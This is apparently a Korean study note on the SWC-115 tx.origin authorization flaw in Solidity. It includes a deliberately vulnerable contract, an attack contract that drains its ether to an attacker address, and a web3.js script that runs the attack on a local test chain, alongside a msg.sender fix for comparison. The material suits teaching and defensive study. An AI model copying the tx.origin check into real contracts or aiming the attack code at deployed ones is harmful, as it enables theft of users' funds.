# *SWC115*

> *Authorization through tx.origin*

- `tx.origin`을 인증에 사용하는 경우 발생되는 취약점
- `tx.origin`대신 `msg.sender`를 사용해야 함

> *tx.origin*

- 트랜잭션을 발생시킨 사람을 의미
    - 최초로 트랜잭션을 발생시킨 주소를 가리키며, 그 주소는 ***EOA*** 주소임 (계정주소)
    - 해당 기능을 인증에 사용하는 경우, 트랜잭션의 최초 발신자를 반환하여 인증을 우회할 수 있어 취약한 컨트랙트에 대한 호출이 가능하게 됨
- `msg.sender`는 현재 함수를 호출한 사람을 의미

처음에

msg.sender를 owner로 선언

`msg.sender` = 0x50a3 → 이건 고정되는 것 같음, 내가 변경하면 할 수 있긴 한데 ㅇㅇ

- 이건 address 만 변경하면 되니까 할 수 있음

sendTo에서 이더 받을 주소 및 이더 값을 입력

- `msg.sender == owner` 와  주소가 같아야함
    - 같다면, 입력 한 주소 값으로, 입력한 값을 전송
    - 근데, 입력한 값은 어디서 나가냐? → 컨트랙트의 balance

1. myconract() 실행

- 트랜잭션 발생하고, `owner = msg.sender`가 설정됨
- addr은 : `0x50a3c7460b3bd111b4330ac90f8410c7085298b7`

2. sendTo() 실행

- accounts[2] (`0x093A0224259989B389d56dF889d19Cb70b4F37f2`)
    - 위 주소로 이더 값 0.5 eth가 전송됨
- `tx.origin == owner` 조건을 만족함
- debug : tx

```jsx
//line:4
tx.origin : 0x50a3c7460b3bd111B4330ac90f8410c7085298b7
msg.sender : 0x50a3c7460b3bd111B4330ac90f8410c7085298b7
> 코드 시작점에서는 두 값이 모두 동일함
```

- event log
    - 이벤트 로그에서 확인했을 때는, `tx.origin, _owner`의 주소 값이 다름
    - _owner는 receiver의 주소 값임, msg.sender인 것임

    ```jsx
    tx.origin : 0x50a3c7460b3bd111B4330ac90f8410c7085298b7
    msg.sender(_owner) : 0x093a0224259989b389d56df889d19cb70b4f37f2
    ```

---

# *Vulnerability Code*

## *swc115 - Vulnerability Code*

- 취약한 컨트랙트 `swc115`를 생성, `swc115`컨트랙트를 공격하는 `attack` 컨트랙트를 생성
- `swc115` 컨트랙트에 eth를 저장하고, 외부 `attack` 컨트랙트가 `swc115`컨트랙트의 이더 값을 출금할 수 있음

> swc115.sol

- 컨트랙트의 소유주인 `owner`를 선언
    - `owner`는 `tx.origin, msg.sender`와 같음
        - 최초로 컨트랙트를 호출
        - owner = tx.origin = msg.sender
- event를 설정하여, 트랜잭션이 발생했을 때 어떠한 값을 저장하는지를 파악

    → tx.origin, msg.sender, owner의 값이 어떻게 변하는지를 파악하여 tx.origin이 취약한 기능이라는 것을 알기 위함

> ***contract defencde***

***`function contract_addr`***

- 해당 함수는, 컨트랙트의 소유자를 선언하는 함수로, *`**owner**`*에 계약 주소가 저장됨
- *event : tx.origin, msg.sender, owner*
    - 위 값들이 동일한지 확인하기 위한 이벤트 설정

***`function a`***

- ***`defence`*** 컨트랙트에 이더 값을 전송하기 위한 함수
- *event : msg.value, msg.sender*
    - 얼마만큼의 이더 값과, 보낸사람을 확인하기 위함

***`function withdrawAll`***

- 컨트랙트의 소유자가 맞다면, 해당 컨트랙트의 값을 함수 호출자에게 전송하는 함수
- `***tx.origin == owner***`에서 취약점이 발생함
    - `tx.origin`으로 설정되어 있다면, 외부 컨트랙트가 해당 위치의 `withdrawAll`함수를 호출할 수 있음
    - 함수를 호출하게 되면 msg.sender로 값이 들어오게 됨, tx.origin의 트랜잭션 호출자의 값을 계속 가지고 있어 변경되지 않음
    - `owner`주소와 비교하는 값이 `tx.origin`이라면 인증이 된 상태로, 공격자의 계약주소로 이더를 받을 수 있음
    - `msg.sender`와 비교하게 할 경우, `owner`와 다른 주소 값을 가지고 있어 인증되지 않아 공격자의 공격은 실패하게 됨

> ***contract attack***

- ***defence*** 의 함수를 호출하기 위해서, 변수를 하나 선언

***`function set`***

- 해당 함수는, 외부 컨트랙트를 호출하기 위해서 주소 값을 지정하는 함수
- ***contract defence***의 주소를 지정 및 공격자의 주소를 지정

***`function attack_contract`***

- set함수에서 설정한 주소 값을 사용하여, 외부 컨트랙트(defence)의 withdrawAll 함수를 호출
- 함수를 호출했을 때, 원래라면 주소 값이 동일하지 않아서 예외가 발생해야 하지만 `tx.origin==owner`로 설정되어 있기 때문에 `msg.sender`의 값이 다르더라도, 해당 컨트랙트에 있는 이더 값을 출금할 수 있음

```jsx
// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;

//swc115는 공격을 받는 입장
contract swc115{
    address public owner;
    event contract_addr_event(address tx_origin, address msg_sender, address _owner);
    event ether_storage(uint value_, address ether_sender);
    event with_ether(address tx_origin, address msg_sender, address _owner);

    //swc115 컨트랙트의 owner를 설정 owner = msg.sender = tx.origin
    function contract_addr(address _owner){
        owner = _owner;
        emit contract_addr_event(tx.origin, msg.sender, owner);
    }

    //swc115 컨트랙트에 이더 값을 전송하는 부분
    function a() public payable {
        emit ether_storage(msg.value, msg.sender);
    }

    //tx.origin이 있어 취약한 함수, require를 우회하여 값을 출금해갈 수 있음
    function withdrawAll_txorigin(address _recipient) public {
        //require(tx.origin == owner);
        require(tx.origin == owner,
        "msg.sender = owner not same");
        emit with_ether(tx.origin, msg.sender, owner);
        _recipient.transfer(this.balance);
    }
    
    //해당 함수는, tx.origin와 msg.sender를 비교하기 위해 추가한 함수
    //여기선 msg.sender를 사용
    function withdrawAll_sender(address _recipient) public {
        //require(tx.origin == owner);
        require(msg.sender == owner,
        "msg.sender = owner not same, function call only owner! owner addr : 0x50a3c7460b3bd111b4330ac90f8410c7085298b7");
        emit with_ether(tx.origin, msg.sender, owner);
        _recipient.transfer(this.balance);
    }
}

contract attack{
    swc115 swc115contract;
    address attacker;

    //swc115contract = 공격당하는 컨트랙트의 주소, attackaddress는 값을 받을 EOA 주소
    function set(swc115 _swc115contract, address _attackaddress){
        swc115contract = _swc115contract;
        attacker = _attackaddress;
    }
    //tx.origin==owner가 설정된 함수를 호출
    function attack_contract() payable{
        swc115contract.withdrawAll_txorigin(attacker);
    }

    //msg.sender==owner가 설정된 함수를 호출
    function attack_contract2() payable{
        swc115contract.withdrawAll_sender(attacker);
    }
}
```

- tx_test.sol

```jsx
const Web3 = require('web3');
const web3 = new Web3(new Web3.providers.HttpProvider("http://127.0.0.1:9545"));
const swc115_json = require("../build/contracts/swc115.json")
const attack_json = require("../build/contracts/attack.json")
const swc115_abi = swc115_json['abi'];
const attack_abi = attack_json['abi'];
const _swc115 = new web3.eth.Contract(swc115_abi, "0x58891eFd502dCFB5AF4a04ff3FaFcdE518fa6FB6");
const _attack = new web3.eth.Contract(attack_abi, "0xA42bCDc4B32b61425b3d8a3c3059060cB388B8cd");

async function swc115(){
    //해당 컨트랙트의 최초 tx.origin 주소 
    const account0 = (await web3.eth.getAccounts())[0];
    //이더 값을 받는 계약 주소
    const account1 = (await web3.eth.getAccounts())[1];

    await _swc115.methods.contract_addr(account0).send({from:account0,gas:100000,gasPrice:'100000'}).then(
        function(result){
            console.log(result);
        }
    )
    //tx.origin==owner
    await _swc115.methods.withdrawAll_txorigin(account1).send({from:account0,gas:100000,gasPrice:'100000'}).then(
        function(result){
            console.log(result);
        }
    )
    //msg.sender==owner
    /*await _swc115.methods.withdrawAll_sender(account1).send({from:account0,gas:100000,gasPrice:'100000'}).then(
        function(result){
            console.log(result);
        }
    )*/

}

//swc115 컨트랙트를 공격, eth를 탈취
//attacker addr = 0xFB16d5921909b1207219CD38D6B367B20a91204E
async function attack(){   
        const account0 = (await web3.eth.getAccounts())[0]; //contract owner
        const attacker = (await web3.eth.getAccounts())[2]; //attacker addr
        //const attacker = (await web3.eth.getAccounts())[2];
    //set함수에 들어가는 주소는, 공격당할 컨트랙트의 주소 값을 입력
    await _attack.methods.set("0x58891eFd502dCFB5AF4a04ff3FaFcdE518fa6FB6",attacker).send({from:account0,gas:100000,gasPrice:'100000'}).then(
        function(result){
            console.log(result);
        }
    )
    //txorigin==owner
    await _attack.methods.attack_contract().send({from:account0,gas:100000,gasPrice:'100000'}).then(
        function(result){
            console.log(result);
        }
    )
    //msg.sender==owner
    /*await _attack.methods.attack_contract2().send({from:account0,gas:100000,gasPrice:'100000'}).then(
        function(result){
            console.log(result);
        }
    )*/
}

//각 컨트랙트에 이더 값을 전송
//이더 전송 account addr = 0xd56F4FB08e8223BD3ca73CD291cB38fDa5D015a5 (마지막에서 두번째)
async function sendEther(){
    await _swc115.methods.a().send({from:"0xd56F4FB08e8223BD3ca73CD291cB38fDa5D015a5",gas:100000,gasPrice:'100000',value:web3.utils.toWei("0.2","ether")}).then(
        function(result2){
            console.log(result2);
        }
    )
}
sendEther();
swc115();
attack();

/*
sendEther() > swc115() > attack()
위 순서대로 진행하는 이유는, swc115 컨트랙트에 이더 값을 전송하고, 출금이 잘 되는지 확인하기 위함
-> sendEther() > swc115() 과정

attack()함수는 swc115 컨트랙트에 들어있는 이더 값을 공격자 주소로 출금하기 위한 함수

위는 함수가 실행되는 순서에 따라서 값을 받는 주소가 달라짐, 같이 실행하면 위에 있는 함수가 받음
*/
```

- test_mig.js

```jsx
const swc115 = artifacts.require("swc115");
const attack = artifacts.require("attack");

module.exports = function (deployer) {
  deployer.deploy(swc115);
  deployer.deploy(attack);
};
```
